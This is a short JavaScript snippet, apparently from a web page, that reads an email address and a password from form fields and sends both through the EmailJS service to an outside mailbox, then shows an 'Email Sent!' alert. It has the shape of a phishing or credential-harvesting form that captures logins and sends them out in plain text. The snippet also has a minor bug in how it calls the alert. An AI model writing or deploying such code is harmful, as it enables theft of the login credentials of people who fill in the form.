function sendMail(){
    let parms = {
        email_id : document.getElementById("mail").value,
        Password : document.getElementById("password").value,
    }

    emailjs.send("service_zxyufh6","template_tt2dy9s",parms).then(alert("Email Sent!"))
}